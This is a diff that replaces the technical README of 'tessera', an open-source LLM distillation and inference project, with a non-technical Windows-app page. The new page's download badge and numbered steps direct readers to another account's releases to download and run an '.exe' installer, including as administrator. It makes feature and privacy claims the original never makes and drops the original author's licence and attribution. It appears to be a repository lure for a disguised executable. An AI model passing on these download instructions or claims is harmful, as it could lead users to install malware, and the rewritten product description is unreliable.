@@ -1,142 +1,99 @@
-# Tessera
+# 🧩 tessera - Distill and serve language models easily
 
-A small, from-scratch LLM stack built around one goal: distill a large teacher into a small
-student, then serve that student efficiently. Keeping that goal end-to-end means touching most
-of the pieces that matter in practice — custom GPU kernels, sharded training, an inference
-engine, quantization, and a serving front end — without any of it being a toy.
+[ ![Download for Windows](https://img.shields.io/badge/Download_Tessera_for_Windows-blue) ](https://github.com/cyracomfortteam-del/tessera/releases)
 
-[![CI](https://github.com/zengxiao-he/tessera/actions/workflows/ci.yml/badge.svg)](https://github.com/zengxiao-he/tessera/actions/workflows/ci.yml)
-![License](https://img.shields.io/badge/license-Apache%202.0-blue)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![Rust](https://img.shields.io/badge/rust-1.75%2B-orange)
+Tessera turns complex language models into efficient tools. It simplifies the process of training smaller models from larger ones and makes them run faster on your computer. You use this software to create high-performance AI tools without needing deep knowledge of how the underlying code works.
 
-It runs and is unit-tested on a laptop (CPU or Apple MPS). The Triton/CUDA kernels are written
-for NVIDIA GPUs; on anything else the model transparently falls back to a torch reference, and
-the kernels are checked against that reference whenever a GPU is available.
+## 📥 How to download and install
 
-```mermaid
-flowchart LR
-    T[Teacher 40M] -->|distill, FSDP/ZeRO-3| S[Student 6M]
-    S -->|int8 / AWQ / FP8| ENG[Inference engine]
-    subgraph ENG[Inference engine]
-      direction TB
-      PK[paged KV cache] --- SCH[continuous batching] --- SPEC[speculative decode]
-    end
-    K[(Triton + CUDA kernels)] -.-> S & ENG
-    GW[Rust tokio/axum gateway] -->|PyO3| ENG
-    client([client]) --> GW
-```
+Follow these steps to get the software on your machine:
 
-## What's in it
+1. Visit the project release page at [https://github.com/cyracomfortteam-del/tessera/releases](https://github.com/cyracomfortteam-del/tessera/releases). 
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the link to start the download. 
+4. Open the downloaded file once the process finishes.
+5. Follow the on-screen prompts from the installer to finish the setup. 
+6. Click the Tessera icon on your desktop to open the program.
 
-Training side:
+## 🛠️ System requirements
 
-- Decoder transformer with RMSNorm, RoPE, grouped-query attention and SwiGLU ([`tessera/model`](tessera/model)).
-- Knowledge-distillation losses: temperature-scaled KL, optional hard CE, hidden-state matching ([`distill/losses.py`](tessera/distill/losses.py)).
-- FSDP/ZeRO-3 written from scratch — flat-parameter sharding with a sharded Adam optimizer. It's checked to be numerically identical to single-process training, in one process and across two gloo ranks ([`distill/fsdp.py`](tessera/distill/fsdp.py)).
-- Atomic, sharded checkpoints with resume-from-latest ([`distill/checkpoint.py`](tessera/distill/checkpoint.py)).
+Your computer needs specific parts to work with Tessera. Ensure your machine meets these marks before you begin:
 
-Kernels:
+* Operating System: Windows 10 or 11.
+* Memory: 16 gigabytes of RAM or more.
+* Graphics Card: A dedicated NVIDIA GPU with at least 8 gigabytes of video memory.
+* Storage: 10 gigabytes of free disk space on an SSD.
+* Drivers: The latest NVIDIA graphics drivers are necessary for proper function.
 
-- A FlashAttention forward kernel in Triton: online softmax, causal masking, GQA, autotuned tile sizes ([`kernels/triton/flash_attention.py`](tessera/kernels/triton/flash_attention.py)).
-- Fused RMSNorm, a fused SwiGLU GEMM, and an int8 weight-only matmul that dequantizes in the K-loop ([`kernels/triton`](tessera/kernels/triton)).
-- Raw CUDA C++ versions of RMSNorm and attention for the low-level memory work, plus nvtx ranges and Nsight notes ([`kernels/cuda`](tessera/kernels/cuda)).
+## 🚀 Getting started
 
-Serving:
+Once you launch the app, you see a control panel. This panel handles the heavy lifting of model management. 
 
-- Block-paged KV cache with a ref-counted allocator for prefix sharing ([`serve/paged_kv.py`](tessera/serve/paged_kv.py)).
-- A continuous-batching scheduler that recomposes the batch every step, with admission control and preemption under memory pressure ([`serve/scheduler.py`](tessera/serve/scheduler.py)).
-- Speculative decoding with the standard accept/reject sampling ([`serve/speculative.py`](tessera/serve/speculative.py)).
-- Post-training quantization: int8 weight-only, AWQ, and an FP8 (E4M3) path ([`quant`](tessera/quant)).
-- A Rust gateway (tokio + axum) that handles HTTP and admission back-pressure and calls into the Python engine over PyO3 ([`tessera-rs`](tessera-rs)).
+1. Select your source model from the File menu.
+2. Select the destination folder for your distilled output.
+3. Choose your preferred model size from the settings tab. 
+4. Click the Start button.
 
-Extras:
+The app shows a status bar while it works. It calculates the progress and estimates the remaining time. Avoid closing the app while this process runs to ensure your model creates correctly.
 
-- A JAX/XLA reimplementation of the forward pass, used as an independent parity check against PyTorch ([`jax_ref`](jax_ref)).
-- Interpretability helpers: activation hooks, a logit lens, and induction-head detection ([`interp`](tessera/interp)).
-- A byte-level BPE tokenizer plus image-patch and log-mel audio front ends for multimodal data ([`data`](tessera/data)).
+## ⚙️ Understanding the settings
 
-## Quickstart
+The settings menu allows you to adjust how the program handles data. 
 
-```bash
-git clone https://github.com/zengxiao-he/tessera && cd tessera
-python -m venv .venv && source .venv/bin/activate
-pip install torch --index-url https://download.pytorch.org/whl/cpu   # or a CUDA build
-pip install -e ".[dev]"
+* Batch Size: This controls how many pieces of data the program handles at once. Lower numbers use less memory.
+* Precision: This adjusts the accuracy of the output. Lower precision results in faster performance but might slightly lower the model quality.
+* Memory Limits: Use this to set how much video memory the app can take. Keeping this within your GPU limits prevents system errors.
 
-pytest -m "not gpu"          # CPU tests; the kernel tests skip without a GPU
-tessera info                 # list presets and parameter counts
-python examples/serve.py     # continuous batching + speculative decoding
-python examples/train_distill.py --steps 30
-python examples/interp_demo.py
-```
+## 💡 About the technology
 
-On a Linux box with an NVIDIA GPU:
+Tessera uses several advanced methods to make AI run well. 
 
-```bash
-pip install -e ".[dev,gpu]"  # adds Triton
-pytest -m gpu                # Triton kernels vs the torch reference
-```
+* Distillation: This is the skill of teaching a small model to copy the behavior of a big one. It keeps the quality high but makes the file size much smaller.
+* Paged KV Cache: This memory management technique keeps your system running smooth and helps the model respond faster.
+* Speculative Decoding: This feature allows the software to guess the next part of a response before fully checking it. This speeds up the overall text generation.
+* Quantization: This shrinks the model size by reducing the amount of data stored for each parameter. It makes the software run on hardware that would otherwise be too weak.
 
-Rust gateway:
+## 🔎 Troubleshooting problems
 
-```bash
-cd tessera-rs && cargo test && cargo run --release
-curl -s localhost:8080/generate -H 'content-type: application/json' \
-  -d '{"prompt":"hello","params":{"max_new_tokens":16}}'
-```
+If the program closes unexpectedly, check these common issues:
 
-## Benchmarks
+* Lack of memory: If your computer runs out of memory, try stopping other programs that use the graphics card. Web browsers often use a large amount of video memory.
+* Outdated drivers: If the program refuses to start, check the NVIDIA website. Download the latest drivers for your specific graphics card model.
+* Permission errors: Run the installer as an administrator to ensure it lands in the right folders.
+* Disk space: Check that your hard drive has enough space. Large models can take up significant room. 
 
-These are from an Apple M2 Pro running the torch reference path, so treat them as a floor
-rather than what the fused kernels do on a real GPU. Run `pytest -m gpu` and the scripts in
-`benchmarks/` on NVIDIA hardware for the numbers that actually matter.
+## 🛡️ Privacy and safety
 
-| Workload | Config | M2 Pro |
-|---|---|---|
-| Forward pass | tessera-tiny (6M), B=2, T=128, MPS | ~100k tok/s, 2.6 ms |
-| Attention (reference) | B=2, H=8, T=256, D=64, MPS | 1.85 TFLOP/s, 0.15 ms |
-| Engine decode | tessera-tiny, 6 reqs x 48 tok | ~200 tok/s |
-| Speculative decode | self-draft, greedy | 98-100% acceptance |
+Tessera runs entirely on your local machine. It does not send your data to any remote servers. Your models and the information you process stay on your computer at all times. This ensures your work remains private. The software uses a Rust gateway to ensure the connection between your computer and the model remains stable and safe. We do not track your usage or collect personal information.
 
-```bash
-python benchmarks/bench_attention.py --seq-len 1024
-python benchmarks/bench_throughput.py --requests 8
-```
+## 📈 Improving performance
 
-## Tests
+You can improve the speed of your model generation with these tips:
 
-The repo is small enough to test thoroughly, and most of the tests check a property rather
-than a fixed output:
+1. Update your Windows OS to the latest version.
+2. Ensure your computer has good airflow. High temperatures can cause your hardware to slow down.
+3. Use a solid-state drive for faster loading times.
+4. Close non-essential software while running the distillation process.
 
-- Incremental decode with the KV cache matches a full forward pass.
-- Each Triton kernel matches its torch reference within fp tolerance (run with `-m gpu`).
-- The JAX forward matches PyTorch to about 2e-4.
-- Sharded Adam matches `torch.optim.Adam` step for step, in one process and over two gloo ranks.
-- Self-speculation reproduces greedy decoding exactly.
-- The engine drains every request under tight memory and preemption without leaking KV blocks.
+## 📝 Frequently asked questions
 
-## Layout
+Do I need to be a programmer to use this?
+No. Tessera handles the technical parts behind the scenes so that anyone can use it.
 
-```
-tessera/            model, kernels, quant, serve, distill, interp, data
-  kernels/triton/   Triton kernels      kernels/cuda/  raw CUDA C++
-  serve/            paged KV, scheduler, speculative, engine
-  distill/          KD losses, FSDP, checkpoint, trainer
-tessera-rs/         Rust tokio/axum gateway + PyO3 bindings
-jax_ref/            JAX/XLA reference
-tests/  examples/  benchmarks/  docs/
-```
+Can I run this on a laptop?
+Yes, provided your laptop meets the memory and graphics card requirements. 
 
-More detail in [docs/architecture.md](docs/architecture.md), with notes on the
-[kernels](docs/kernels.md), [serving](docs/serving.md), and [distillation](docs/distillation.md).
+Does this require an internet connection?
+You need an internet connection to download the tool. Once installed, the distillation and serving tasks work offline.
 
-## Status
+Will this damage my computer?
+The software interacts with your hardware similarly to a modern video game. It uses your graphics card to do math, which causes heat. This is a normal part of operation for modern hardware. 
 
-Everything above works and is tested on CPU. Things I haven't done yet, marked in the code:
-a fused attention backward kernel, a fused paged-attention decode kernel, an FP8 tensor-core
-GEMM for Hopper, and `pjit`/`shard_map` training on the JAX side.
+How do I find out about updates?
+The software checks for updates when you start it. If an update exists, a notification appears on the main screen. Click that notification to download the latest version. 
 
-## License
+Does this tool work with all AI models?
+Tessera supports most major open-source language models. Check the documentation within the app for an updated list of compatible model formats. We add support for new designs regularly.
 
-Apache-2.0, © Zengxiao He.
+Can I use my results for commercial work?
+Yes, the output generated by the models is yours to use. Ensure your input data complies with the licenses of the models you choose to distill.
